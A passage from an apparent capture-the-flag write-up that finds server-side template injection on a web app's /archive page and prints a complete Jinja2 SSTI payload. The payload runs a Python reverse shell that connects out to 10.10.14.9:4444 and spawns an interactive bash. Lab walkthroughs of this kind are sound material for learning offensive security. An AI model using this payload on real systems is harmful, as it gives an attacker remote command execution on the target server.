and we got a login page and we signed up ==SSTI==

then we saw ==/archive== page it was blank but when we did ctrl+U we saw 4 means the ssti worked

then we did

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
